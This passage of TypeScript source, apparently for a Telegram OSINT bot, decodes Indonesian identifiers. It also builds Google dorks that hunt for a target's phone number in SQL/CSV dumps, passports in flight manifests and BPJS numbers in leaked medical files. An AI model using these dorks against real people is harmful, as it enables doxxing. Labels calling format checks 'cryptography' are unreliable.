          if (tag === '54') amountStr = `Rp ` + Number(val).toLocaleString('id-ID');
          if (tag === '58') merchantCriteria = val; // Country Code
          if (tag === '59') merchantName = val;
          if (tag === '60') merchantCity = val;
          
          i += 4 + len;
        }
      } catch(e) {}
      
      const payloadHash = btoa(payload.substring(0, 15) + "...");
      
      const reply = `<b>🏦 QRIS VIRTUAL DECODER (EMVCo)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `<b>[1] 🏪 DATA ACQUIRER / MERCHANT:</b>\n` +
                    `├ <b>NAMA:</b> <code>${merchantName}</code>\n` +
                    `├ <b>LOKASI KOTA:</b> <code>${merchantCity}</code>\n` +
                    `├ <b>KATEGORI (MCC):</b> <code>${merchantCategoryCode}</code>\n` +
                    `└ <b>KODE NEGARA:</b> <code>${merchantCriteria}</code>\n\n` +
                    `<b>[2] 💳 PARAMETER TRANSAKSI:</b>\n` +
                    `├ <b>Tipe QRIS:</b> <code>${initMethod}</code>\n` +
                    `├ <b>Mata Uang:</b> ${currencyCode}\n` +
                    `└ <b>Nominal Tagihan:</b> <code>${amountStr}</code>\n\n` +
                    `<b>[3] 🛡️ INTEGRITAS DATA:</b>\n` +
                    `└ <b>Checksum CRC:</b> <code>${payload.slice(-4)}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Payload didecode eksklusif secara offline (tanpa Hit Switcher).</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('rekening', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format: /rekening [Nomor Rekening]");
      const rek = args[1].replace(/[^0-9]/g, '');
      const q = encodeURIComponent(`"${rek}"`);
      const reply = `<b>💳 BANK FRAUD OSINT DORKING</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `🔍 <b>IDENTIFIKATOR REKENING:</b> <code>${rek}</code>\n\n` +
                    `<b>[1] 🚨 ANALISIS INDIKASI PENIPUAN (SCAM/FRAUD):</b>\n` +
                    `├ 🌐 <b>Google Deep Dork:</b> <a href="https://www.google.com/search?q=${q}+penipu+OR+scam+OR+waspada+OR+laporan+OR+penipuan+OR+blacklist">Jejak Pelaporan Kasus di Web</a>\n` +
                    `├ 🐦 <b>X.com (Twitter) Audit:</b> <a href="https://twitter.com/search?q=${rek}">Cari Viralisasi & Komplain Terbuka</a>\n` +
                    `├ 📘 <b>Facebook Intelligence:</b> <a href="https://www.facebook.com/search/posts?q=${q}">Pemantauan Grup Jual-Beli Blacklist</a>\n` +
                    `└ 🗃️ <b>Kaskus Surat Pembaca:</b> <a href="https://www.google.com/search?q=site:kaskus.co.id+Surat+Pembaca+${q}">Investigasi Forum Regional</a>\n\n` +
                    `<b>[2] 🏛️ DATABASE RESMI OTORITAS (Input Manual):</b>\n` +
                    `├ 🛡️ <b>CekRekening.id (Kominfo):</b> Kunjungi <i>cekrekening.id</i>\n` +
                    `└ 🏢 <b>Kredibel Profiler:</b> <a href="https://www.kredibel.co.id/search/${rek}">Verifikasi Rating Transaksi (Pihak Ke-3)</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Disclaimer: Lakukan verifikasi menyeluruh sebelum bertransaksi.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('paspor', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format: /paspor [Nomor Paspor Indonesia]");
      let paspor = args[1].toUpperCase();
      let valid = false;
      let type = "Unknown (Tidak Sesuai Algoritma Imigrasi RI)";
      let pageType = "Tidak Terdeteksi";
      
      if (/^[A-Z]{1,2}[0-9]{7}$/.test(paspor)) {
        valid = true;
        if(paspor.startsWith('X')) {
          type = 'E-Paspor (Polikarbonat) / Generasi Baru';
        } else if (paspor.startsWith('B') || paspor.startsWith('C')) {
          type = 'Paspor Biasa / E-Paspor Umum';
        } else {
          type = 'Paspor Umum (Pre-2023 Reguler)';
        }
      }
      
      const dork1 = encodeURIComponent(`"${paspor}" ext:pdf OR ext:xls OR ext:csv`);

      const reply = `<b>🛂 PASSPORT INTELLIGENCE (IMIGRASI RI)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📖 <b>NOMOR SERI PASPOR:</b> <code>${paspor}</code>\n\n` +
                    `<b>[1] 🧬 VALIDASI STRUKTURAL:</b>\n` +
                    `├ <b>Status Enkripsi:</b> ${valid ? '✅ STRUKTUR VALID (Algoritma Alfabet/Numerik)' : '❌ INVALID FORMAT (Kemungkinan Fake Data)'}\n` +
                    `└ <b>Estimasi Tipe Paspor:</b> ${type}\n\n` +
                    `<b>[2] 🔎 DEEP DORK INVESTIGASI BORDER/HOTEL:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${dork1}">Lacak Nomor Paspor pada Dokumen Terbuka (Manifest Penerbangan/Hotel Booking)</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Modul OSINT paspor hanya memvalidasi standar serialisasi Dirjen Imigrasi, bukan akses query real-time ke sistem Cekal.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('bank_indo', (ctx) => {
      const args = ctx.message.text.substring(10).trim().toLowerCase();
      if (!args) return ctx.reply("⚠️ Format: /bank_indo [Nama Bank]. Contoh: /bank_indo bca");
      
      const bankDb: Record<string, string> = {
        'bca': 'Bank Central Asia (BCA) | Kode Transfer SWIFT/KLIRING: 014',
        'mandiri': 'Bank Mandiri | Kode Transfer SWIFT/KLIRING: 008',
        'bni': 'Bank Negara Indonesia (BNI) | Kode Transfer SWIFT/KLIRING: 009',
        'bri': 'Bank Rakyat Indonesia (BRI) | Kode Transfer SWIFT/KLIRING: 002',
        'bsi': 'Bank Syariah Indonesia (BSI) | Kode Transfer SWIFT/KLIRING: 451',
        'cimb': 'Bank CIMB Niaga | Kode Transfer SWIFT/KLIRING: 022',
        'permata': 'Bank Permata | Kode Transfer SWIFT/KLIRING: 013',
        'danamon': 'Bank Danamon | Kode Transfer SWIFT/KLIRING: 011',
        'mega': 'Bank Mega | Kode Transfer SWIFT/KLIRING: 426',
        'jenius': 'BTPN (Jenius) | Kode Transfer SWIFT/KLIRING: 213',
        'jago': 'Bank Jago | Kode Transfer SWIFT/KLIRING: 542',
        'seabank': 'SeaBank / Kesejahteraan Ekonomi | Kode Transfer SWIFT/KLIRING: 535',
        'blu': 'BCA Digital (blu) | Kode Transfer SWIFT/KLIRING: 501',
        'artos': 'Bank Artos (Jago) | Kode Transfer SWIFT/KLIRING: 542',
        'btn': 'Bank Tabungan Negara (BTN) | Kode Transfer SWIFT/KLIRING: 200',
        'panin': 'Panin Bank | Kode Transfer SWIFT/KLIRING: 019'
      };
      
      let found = "";
      for (const [k, v] of Object.entries(bankDb)) {
        if (k.includes(args) || args.includes(k)) {
            found += `• <b>${v}</b>\n`;
        }
      }
      if (!found) found = "❌ Status OJK: Indikator Bank Tidak Terdaftar di Database Internal Agent.";
      ctx.reply(`<b>🏦 ID IDENTIFIKASI BANK INDONESIA (SWIFT)</b>\n━━━━━━━━━━━━━━━━━━━━\n🔍 Parameter Pencarian: <i>${args.toUpperCase()}</i>\n\n${found}\n━━━━━━━━━━━━━━━━━━━━`, { parse_mode: 'HTML' });
    });

    bot.command('kodepos', async (ctx) => {
      const args = ctx.message.text.substring(8).trim();
      if (!args) return ctx.reply("⚠️ Format: /kodepos [Nama Kecamatan/Kelurahan / Kode Pos]");
      
      let apiResult = "";
      try {
        const response = await axios.get(`https://kodepos.vercel.app/search?q=${encodeURIComponent(args)}`, {
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
          }
        });
        const data = response.data;
        if (data && data.data && data.data.length > 0) {
            const hasil = data.data.slice(0, 5);
            apiResult = `<b>[LIVE API] DAFTAR KODEPOS DITEMUKAN:</b>\n`;
            hasil.forEach((h: any) => {
                apiResult += `├ <b>${h.postalcode}</b> (${h.subdistrict}, ${h.city}, ${h.province})\n`;
            });
            apiResult += `\n`;
        } else {
            apiResult = `<b>[LIVE API] KODEPOS:</b> ❌ Tidak ditemukan di pangkalan data API (Coba masukkan nama kelurahan/kecamatan yang lebih spesifik).\n\n`;
        }
      } catch (e) {
        apiResult = `<b>[LIVE API] KODEPOS:</b> ❌ Gagal tersambung ke Endpoint OpenAPI.\n\n`;
      }
      
      const q = encodeURIComponent(`"Kode Pos" ${args} site:kodepos.nomor.net OR site:nomor.net`);
      const q2 = encodeURIComponent(`"Kode Pos" "${args}"`);
      const reply = `<b>📮 KODEPOS & REGION GEO-LOCATOR (API)</b>\n━━━━━━━━━━━━━━━━━━━━\n📍 <b>DAERAH / KODE TARGET:</b> <code>${args}</code>\n\n` +
                `${apiResult}` +
                `<b>[1] 🏛️ DATABASE RESMI KODEPOS DORKING:</b>\n` +
                `└ 🔍 <a href="https://www.google.com/search?q=${q}">Cari Resolusi Geografis di Direktori Kodepos</a>\n\n` +
                `<b>[2] 🌐 PENCARIAN TERBUKA GOOGLE:</b>\n` +
                `└ 🔍 <a href="https://www.google.com/search?q=${q2}">Pencarian Bebas (Alamat Spesifik & Koordinat)</a>\n` +
                `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('hlr', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format: /hlr [08xx / 628xx]");
      let p = args[1].replace(/[^0-9]/g, '');
      if (p.startsWith('62')) p = '0' + p.substring(2);
      
      let provider = "Unknown / Routing Tidak Terdaftar";
      let prefix = p.substring(0, 4);
      
      if (['0811','0812','0813','0821','0822','0823','0851','0852','0853'].includes(prefix)) provider = "Telkomsel / Halo";
      else if (['0814','0815','0816','0855','0856','0857','0858'].includes(prefix)) provider = "Indosat Ooredoo Hutchison";
      else if (['0817','0818','0819','0859','0877','0878'].includes(prefix)) provider = "XL Axiata";
      else if (['0831','0832','0833','0838'].includes(prefix)) provider = "Axis / ALXA";
      else if (['0895','0896','0897','0898','0899'].includes(prefix)) provider = "Three (3 / Hutchison)";
      else if (['0881','0882','0883','0884','0885','0886','0887','0888','0889','0880'].includes(prefix)) provider = "Smartfren Telecom";
      
      const pInt = p.startsWith('0') ? '62' + p.substring(1) : p;
      const getcontactDork = encodeURIComponent(`"${p}" OR "${pInt}" site:getcontact.com`);
      const truecallerDork = encodeURIComponent(`"${p}" OR "${pInt}" site:truecaller.com`);
      const teleDork = `tg://resolve?domain=Getcontactbot`;
      
      const reply = `<b>📡 ADVANCED HLR LOOKUP (TELECOM INDO)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📱 <b>NOMOR MSISDN:</b> <code>${p}</code> (Intl: +${pInt})\n\n` +
                    `<b>[1] 📋 ROUTING PREFIX (HLR INFRA):</b>\n` +
                    `├ <b>Nomor Area/Prefix:</b> <code>${prefix}</code>\n` +
                    `└ <b>Provider/Operator:</b> ${provider}\n\n` +
                    `<b>[2] 🛡️ SOCIAL ENGINEERING & SPAM INVESTIGASI:</b>\n` +
                    `├ 🌐 <a href="https://www.google.com/search?q=${getcontactDork}">Cari Indeks Publik Getcontact (Dork)</a>\n` +
                    `├ 🌐 <a href="https://www.google.com/search?q=${truecallerDork}">Cari Indeks TrueCaller Web Data</a>\n` +
                    `└ 🤖 <a href="${teleDork}">Cari Manual bot Tele GetContact ID</a>\n\n` +
                    `<b>[3] 🔑 DATA LEAK OSINT:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=%22${pInt}%22+OR+%22${p}%22+ext:txt+OR+ext:sql+OR+ext:csv">Pengecekan Text/SQL Dump (Kebocoran)</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Analisis mencerminkan alokasi Prefix Kominfo, tidak mencakup Porting Nomor (MNP).</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('lpse', (ctx) => {
      const args = ctx.message.text.substring(5).trim();
      if (!args) return ctx.reply("⚠️ Format: /lpse [Nama Vendor PT / Proyek / Tender]");
      const q1 = encodeURIComponent(`"${args}" site:lpse.*.go.id`);
      const q2 = encodeURIComponent(`"Pemenang Tender" OR "Surat Penunjukan" "${args}" filetype:pdf`);
      ctx.reply(`<b>🏢 LPSE PROCUREMENT & BUMN (TENDER OSINT)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                `🏗️ <b>KODE / NAMA VENDOR / PROYEK:</b> <code>${args}</code>\n\n` +
                `<b>[1] 🏛️ DORK DATABASE TENDER PEMERINTAH NASIONAL:</b>\n` +
                `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Scan History Lelang Proyek Pemerintahan di Jaringan LPSE/LKPP (Go.id)</a>\n\n` +
                `<b>[2] 📑 EKSFILTRASI DOKUMEN PEMENANG / SPK (PDF):</b>\n` +
                `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Lacak Bocoran PDF Persetujuan & Penandatanganan Tender Pemerintah</a>\n\n` +
                `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Modul Open Source untuk Background Check Perusahaan Kontraktor Pemborong Proyek Negara.</i>`, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('bpom', (ctx) => {
      const args = ctx.message.text.substring(5).trim();
      if (!args) return ctx.reply("⚠️ Format: /bpom [Nomor Registrasi BPOM / Nama Produk]");
      const q1 = encodeURIComponent(`"${args}" site:cekbpom.pom.go.id OR site:notifkos.pom.go.id`);
      const q2 = encodeURIComponent(`"Tarik" OR "Beredar" OR "Berbahaya" "${args}" site:go.id`);
      const reply = `<b>💊 BPOM & DRUG/FOOD SAFETY (BPOM CHECKER)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📦 <b>TARGET OBJEK/KOSMETIK/MAKANAN:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ PEMERIKSAAN LEGALITAS DATABASE BPOM:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Scan Registrasi & Notifikasi Produk (CekBPOM/NotifKos)</a>\n\n` +
                    `<b>[2] 🚨 INVESTIGASI BLACKLIST & PENARIKAN (RECALL):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Cek Peringatan Bahaya Kosmetik/Obat di Portal Pemerintahan RI</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Tools membantu pengecekan sertifikasi POM / Kosmetik Ilegal pada open source.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('gempa', async (ctx) => {
      try {
        const response = await axios.get("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
        const gempa = response.data?.Infogempa?.gempa;
        
        if (gempa) {
          const reply = `<b>⚠️ PUSAT INFO GEMPA BUMI BMKG (LIVE API)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                        `🔴 <b>WAKTU:</b> <code>${gempa.Tanggal} | ${gempa.Jam}</code>\n` +
                        `📍 <b>LOKASI:</b> <code>${gempa.Wilayah}</code>\n` +
                        `📊 <b>MAGNITUDO:</b> <code>${gempa.Magnitude} SR</code>\n` +
                        `🌐 <b>KOORDINAT:</b> <code>${gempa.Coordinates}</code>\n` +
                        `🌊 <b>POTENSI HASIL DEEP SCAN BMKG:</b>\n` +
                        `└ <i>${gempa.Potensi}</i>\n\n` +
                        `<b>[Dampak Dirasakan]:</b>\n> ${gempa.Dirasakan || 'Belum ada data skala MMI'}\n\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n<i>Terhubung ke jaringan Telemetri Gempa Otomatis BMKG Nasional.</i>`;
          
          if (gempa.Shakemap) {
            const imageUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
            await ctx.replyWithPhoto({ url: imageUrl }, { caption: reply, parse_mode: 'HTML' });
          } else {
            ctx.reply(reply, { parse_mode: 'HTML' });
          }
        } else {
          ctx.reply("❌ Sistem BMKG tidak mengembalikan data struktur gempa yang valid.");
        }
      } catch (err) {
        ctx.reply("❌ Gagal terhubung ke Pangkalan Data Geofisika Nasional (API BMKG Down).");
      }
    });

    bot.command('nip', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format: /nip [18 Digit NIP]");
      const nip = args[1].replace(/[^0-9]/g, '');
      if (nip.length !== 18) return ctx.reply("❌ Format Salah Cek Profiler: NIP ASN/PNS harus berjumlah presisi 18 digit.");
      
      const year = nip.substring(0, 4);
      const month = nip.substring(4, 6);
      const day = nip.substring(6, 8);
      const tmtYear = nip.substring(8, 12);
      const tmtMonth = nip.substring(12, 14);
      const jkCode = nip.substring(14, 15);
      const urut = nip.substring(15, 18);
      
      const jk = jkCode === '1' ? 'LAKI-LAKI 👨' : jkCode === '2' ? 'PEREMPUAN 👩' : 'ANOMALI (Bukan ASN)';
      const dork1 = encodeURIComponent(`"${nip}" site:bkn.go.id OR site:lpse.*.go.id OR site:go.id`);
      const dork2 = encodeURIComponent(`"${nip}" ext:pdf OR ext:xls OR ext:csv`);
      
      const reply = `<b>👔 OSINT ASN/PNS DECODER (NIP PROFILER)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📋 <b>NOMOR INDUK PEGAWAI:</b> <code>${nip}</code>\n\n` +
                    `<b>[1] 🧬 ANALISIS PERSONAL APARATUR:</b>\n` +
                    `├ <b>Tanggal Lahir:</b> <code>${day}-${month}-${year}</code>\n` +
                    `└ <b>Jenis Kelamin:</b> ${jk}\n\n` +
                    `<b>[2] 🏛️ HISTORIS SK PENGANGKATAN (TMT):</b>\n` +
                    `├ <b>Bulan Pengangkatan CPNS:</b> <code>Bulan ${tmtMonth}</code>\n` +
                    `└ <b>Tahun Angkatan Lulus:</b> <code>Tahun ${tmtYear}</code>\n\n` +
                    `<b>[3] 🔢 TEKNIKAL ADMINISTRASI:</b>\n` +
                    `└ <b>Nomor Urut Pendaftaran/Golongan:</b> <code>${urut}</code>\n\n` +
                    `<b>[4] 🔎 DEEP DORK INVESTIGASI (Open Source):</b>\n` +
                    `• <a href="https://www.google.com/search?q=${dork1}">Lacak Target di Situs Pemerintahan (go.id) / Mutasi BKN</a>\n` +
                    `• <a href="https://www.google.com/search?q=${dork2}">Cari Log SK Kenaikan Pangkat / Dokumen Terbuka</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Algoritma validasi ekstraksi Nomor Induk Pegawai Terstandarisasi BKN.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('bpjs', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format: /bpjs [Nomor KPJ/KIS]");
      const bpjs = args[1].replace(/[^0-9]/g, '');
      let type = "Unknown (Tidak Masuk Algoritma Standar)";
      let status = "❌ Format anomali. KPJ (Ketenagakerjaan) 11 digit, KIS (Kesehatan) 13 digit.";
      if (bpjs.length === 11) {
          type = "Jamsostek / BPJS Ketenagakerjaan (KPJ)";
          status = "✅ Struktur Serial Format Reguler Valid (11 Digit)";
      } else if (bpjs.length === 13) {
          type = "JKN / BPJS Kesehatan (KIS)";
          status = "✅ Struktur Serial Kartu Aktif Valid (13 Digit)";
      }
      
      const q = encodeURIComponent(`"${bpjs}"`);
      const q2 = encodeURIComponent(`"${bpjs}" ext:xls OR ext:csv`);
      const reply = `<b>🏥 BPJS/JKN IDENTITY ANALYZER</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📋 <b>NOMOR KARTU TARGET:</b> <code>${bpjs}</code>\n\n` +
                    `<b>[1] 🏷️ TIPE ASURANSI & JAMINAN SOSIAL:</b>\n` +
                    `└ <b>Kategori Database:</b> ${type}\n\n` +
                    `<b>[2] 🤖 STATUS VALIDASI STRUKTUR:</b>\n` +
                    `└ <b>Hasil Analisis:</b> ${status}\n\n` +
                    `<b>[3] 🔎 DEEP DORK INVESTIGASI (Open Source):</b>\n` +
                    `• <a href="https://www.google.com/search?q=${q}">Pemantauan Penindeks Publik (Web Crawler Profiling)</a>\n` +
                    `• <a href="https://www.google.com/search?q=${q2}">Audit Kebocoran File Data Medis / HRD Perusahaan Terbuka</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Memeriksa algoritma panjang serial BPJS yang berlaku secara fundamental di Indonesia.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('nib', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format: /nib [13 Digit NIB]");
      const nib = args[1].replace(/[^0-9]/g, '');
      if (nib.length !== 13) return ctx.reply("❌ Sistem Deteksi: Format NIB (Nomor Induk Berusaha) harus terstruktur 13 digit.");
      
      const q = encodeURIComponent(`"${nib}" site:oss.go.id OR site:*.go.id`);
      const reply = `<b>🏢 NIB BUSINESS REGISTRY OSINT (ENTERPRISE)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📋 <b>NIB (Nomor Induk Berusaha):</b> <code>${nib}</code>\n` +
                    `🤖 <b>VALIDASI SISTEM:</b> ✅ 13 Digit OSS Protocol V.1/V.2 Valid\n\n` +
                    `<b>🔍 Dork Pencarian Profil Investasi Ekosistem Pemerintahan:</b>\n` +
                    `1. <a href="https://www.google.com/search?q=${q}">Cek Skema NIB di Domain Instansi K/L/D/I Nasional (.go.id)</a>\n` +
                    `2. <a href="https://www.google.com/search?q=%22${nib}%22">Pencarian Universal NIB (Portal Berita Nasional / Hukum)</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('bpkb', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format: /bpkb [Kode Nomor BPKB]");
      const bpkb = args[1].toUpperCase();
      let formatStatus = "❌ Peringatan: Tidak Sesuai Pola Standar Buku Kepemilikan (Palsu/Invalid)";
      
      if (/^[A-Z]{1,2}-?\d{7,8}$/.test(bpkb)) {
          formatStatus = "✅ Struktur Serial Format Lulus (Polikarbonat/Buku Biru Standar Korlantas)";
      } else if (/^\d{8,9}$/.test(bpkb)) {
          formatStatus = "✅ Struktur Standar Numerik (Lulus Pengecekan Pola)";
      }
      const q1 = encodeURIComponent(`"BPKB" "${bpkb}" OR "Lelang" OR "Leasing"`);
      const q2 = encodeURIComponent(`"BPKB" "${bpkb}" ext:pdf OR ext:xls OR ext:csv`);
      
      const reply = `<b>🚗 SECURITY & DOC ANALYZER (BPKB)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📄 <b>NO SERIAL KEPEMILIKAN:</b> <code>${bpkb}</code>\n\n` +
                    `<b>[1] 🧬 VALIDASI ALGORITMA DOC (Cryptography):</b>\n` +
                    `└ <b>Integritas Format:</b> ${formatStatus}\n\n` +
                    `<b>[2] 🔎 DEEP DORK INVESTIGASI ASET:</b>\n` +
                    `├ 🌐 <a href="https://www.google.com/search?q=${q1}">Pemantauan Kasus Blokir / Tarikan Leasing / Lelang Terbuka</a>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Scan Dump Data Jaminan / File Pinjaman BPKB Online (PDF/Excel)</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Offline Validator, tidak terkoneksi E-TLE & E-Samsat Regident Korlantas POLRI RI.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('sertipikat', (ctx) => {
      const args = ctx.message.text.substring(12).trim();
      if (!args) return ctx.reply("⚠️ Format: /sertipikat [Nomor Hak/NIB Tanah/Nama Objek]");
      const q1 = encodeURIComponent(`"${args}" site:bhumi.atrbpn.go.id OR site:ptsp.atrbpn.go.id`);
      const q2 = encodeURIComponent(`"${args}" site:putusan3.mahkamahagung.go.id`);
      const q3 = encodeURIComponent(`"${args}" "Sertifikat Tanah" OR "Lelang" OR "Sengketa" filetype:pdf`);
      
      const reply = `<b>🗺️ BPN / AGRARIA INTELLIGENCE (SHM/HGU)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📄 <b>OBJEK (SHM/SHGB/HGU/HP/NIB):</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ PEMINDAIAN DATABASE PORTAL BPN(ATR):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Pelacak Jejak Layanan Pertanahan Digital (BHUMI/PTSP)</a>\n\n` +
                    `<b>[2] ⚖️ INVESTIGASI SENGKETA LAHAN & ASET PERKARA:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Audit Konflik Tanah di Putusan Direktori MA</a>\n\n` +
                    `<b>[3] 📄 SCAN DOKUMEN JAMINAN BANK / LELANG LAHAN:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q3}">Eksfiltrasi Log Data Aset Lelang & Surat Hutang Publik (PDF)</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Memfasilitasi Open Source Intelligence Aset properti dan pertanahan nasional.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('yudisium', async (ctx) => {
      const args = ctx.message.text.substring(10).trim();
      if (!args) return ctx.reply("⚠️ Format: /yudisium [Nama Lengkap / NIM Mahasiswa]");
      
      let apiResult = "";
      try {
          const response = await axios.get(`https://api-frontend.kemdikbud.go.id/hit/${encodeURIComponent(args)}`, {
              headers: {
                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                  "Accept": "application/json"
              },
              timeout: 8000
          });
          const data = response.data;
          
          if (data && data.mahasiswa && data.mahasiswa.length > 0) {
              const mhs = data.mahasiswa.slice(0, 5); // Ambil top 5
              apiResult = `<b>[LIVE API] DAFTAR ENTITAS PDDIKTI:</b>\n`;
              mhs.forEach((m: any, i: number) => {
                  const textInfo = m.text.replace(/<[^>]+>/g, '');
                  apiResult += `├ ${i+1}. <code>${textInfo}</code>\n`;
              });
              apiResult += `\n`;
          } else {
              apiResult = `<b>[LIVE API] PDDIKTI:</b> ❌ Tidak ada data mahasiswa yang cocok.\n\n`;
          }
      } catch (err) {
          apiResult = `<b>[LIVE API] PDDIKTI:</b> ❌ Akses ke server Kemdikbud diblokir / Timeout (WAF Protection). Gunakan Dorking di bawah.\n\n`;
      }
      
      const q = encodeURIComponent(`"${args}" site:pddikti.kemdikbud.go.id`);
      const q2 = encodeURIComponent(`"${args}" yudisium OR ijazah OR skripsi OR tesis OR disertasi site:ac.id OR site:go.id`);
      const q3 = encodeURIComponent(`"${args}" site:scholar.google.co.id OR site:neliti.com`);
      
      const reply = `<b>🎓 AKADEMIK & PDDIKTI CHECKER (LIVE API)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 <b>TARGET CIVITAS AKADEMIKA:</b> <code>${args}</code>\n\n` +
                    `${apiResult}` +
                    `<b>[1] 🏛️ INVESTIGASI PANGKALAN DATA DIKTI DORKING:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q}">Lacak Entri Transkrip, SKS, / Riwayat DropOut</a>\n\n` +
                    `<b>[2] 📚 INVESTIGASI DOKUMEN REPOSITORI (Kampus Dasar):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Scan Repositori .ac.id untuk Jejak Kelulusan Sidang</a>\n\n` +
                    `<b>[3] 🔬 VERIFIKASI JURNAL/PUBLIKASI ILMIAH:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q3}">Cari Jejak Penulis Jurnal & Google Scholar</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Integrasi Hybrid: Live API Kemdikbud + Pemindaian OSINT Google Dorking.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('putusan', (ctx) => {
      const args = ctx.message.text.substring(9).trim();
      if (!args) return ctx.reply("⚠️ Format: /putusan [Nama Lengkap / Keyword Kasus]");
      const q1 = encodeURIComponent(`"${args}" site:putusan3.mahkamahagung.go.id`);
      const q2 = encodeURIComponent(`"${args}" site:sipp.*.go.id`);
      const q3 = encodeURIComponent(`"${args}" pailit OR pidana OR korupsi OR pengadilan`);
      
      const reply = `<b>⚖️ INVESTIGASI HUKUM MAHKAMAH AGUNG & SIPP</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `🧑‍⚖️ <b>SUBJEK PERKARA TERTENTU:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ SUMBER DATA PUTUSAN MA / INKRACHT:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Penelusuran Arsip Register Direktori Mahkamah Agung (Nasional)</a>\n\n` +
                    `<b>[2] 🛡️ SIPP PENGADILAN NEGERI/AGAMA (Mediasi & Sidang):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Tracking Sistem Informasi Penelusuran Perkara Basis Wilayah PN</a>\n\n` +
                    `<b>[3] 🔎 PEMANTAUAN BERITA KRIMINAL / PAILIT:</b>\n` +
